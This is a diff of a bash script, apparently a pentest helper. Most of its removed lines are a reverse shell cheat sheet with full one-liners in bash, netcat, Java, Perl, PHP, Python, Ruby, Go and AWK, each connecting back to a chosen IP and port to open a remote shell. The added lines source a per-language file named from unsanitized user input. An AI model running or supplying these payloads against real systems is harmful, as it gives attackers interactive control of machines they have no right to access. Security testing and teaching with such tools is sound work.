@@ -84,66 +84,12 @@ display_reverse_shell_cheat () {
     # Receveid the language and display the correct reverse shell syntax
     if [ "$#" != 0 ]
     then
-        case "$1" in
-            bash)
-                echo -e "\033[31m\033[1mREVERSE SHELL CHEAT: [bash]\033[m"
-                echo -e "\t\033[1mbash -i >& /dev/tcp/$IP/$PORT 0<&1"
-                ;;
-            netcat | nc)
-                echo -e "\033[31m\033[1mREVERSE SHELL CHEAT: [netcat]\033[m"
-                echo -e "\033[31m\033[1mAlternative with -e working:\033[m"
-                echo -e "\t\033[1mnc -e /bin/sh $IP $PORT\033[m"
-                echo -e "\033[31m\033[1mAlternative withput -e:\033[m"
-                echo -e "\t\033[1mrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f\033[m"
-                ;;
-            java | jar)
-                echo -e "\033[31m\033[1mREVERSE SHELL CHEAT: [java]\033[m"
-                echo -e "\t\033[1mr = Runtime.getRuntime()\033[m"
-                echo -e "\t\033[1mp = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$IP/$PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])\033[m"
-                echo -e "\t\033[1mp.waitFor()\033[m"
-                ;;
-            perl | pl)
-                echo -e "\033[31m\033[1mREVERSE SHELL CHEAT: [perl]\033[m"
-                echo -e "\033[31m\033[1mFor Linux hosts:\033[m"
-                echo -e  "\t\033[1mperl -e 'use Socket;\$i=\"$IP\";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\033[m"
-                echo -e "\033[31m\033[1mFor Linux hosts without /bin/sh:\033[m"
-                echo -e "\t\033[1mperl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$IP:$PORT\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'\033[m"
-                echo -e "\033[31m\033[1mFor Windows hosts:\033[m"
-                echo -e "\t\033[1mperl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"$IP:$PORT\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'\033[m"
-                ;;
-            php)
-                echo -e "\033[31m\033[1mREVERSE SHELL CHEAT: [php]\033[m"
-                echo -e "\t\033[1mphp -r '"'$sock'"=fsockopen(\"$IP\","$PORT");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
-                ;;
-            python | py)
-                echo -e "\033[31m\033[1mREVERSE SHELL CHEAT:\033[m"
-                echo -e "\033[31m\033[1m [python2]\033[m"
-                echo -e  "\t\033[1mpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\033[m"
-                echo -e "\033[31m\033[1m [python3]\033[m"
-                echo -e  "\t\033[1mpython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\033[m"
-                ;;
-            ruby | rb)
-                echo -e "\033[31m\033[1mREVERSE SHELL CHEAT: [ruby]\033[m"
-                echo -e "\033[31m\033[1mFor Linux hosts:\033[m"
-                echo -e "\t\033[1mruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$IP\",\"$PORT\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\033[m"
-                echo -e "\033[31m\033[1mFor Windows hosts:\033[m"
-                echo -e "\t\033[1mruby -rsocket -e c=TCPSocket.new(\"$IP\",\"$PORT\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
-                ;;
-            golang | go)
-                echo -e "\033[31m\033[1mREVERSE SHELL CHEAT: [golang]\033[m"
-                echo -e "\t\033[1mecho 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$IP:$PORT\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go\033[m"
-                ;;
-            AWK | awk)
-                echo -e "\033[31m\033[1mREVERSE SHELL CHEAT: [AWK]\033[m"
-                echo -e "\t\033[1mawk 'BEGIN {s = \"/inet/tcp/0/$IP/$PORT\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
-                ;;
-            xterm)
-                echo "xterm"
-                ;;
-            *)
-                display_help && exit 1
-                ;;
-        esac
+        lang=$(echo "$1" | tr '[:upper:]' '[:lower:]')
+        if [ -e "data/reverse/$lang" ]; then
+            source "data/reverse/$lang"
+        else
+            display_help && exit 1
+        fi
     else
             display_help && exit 1
     fi
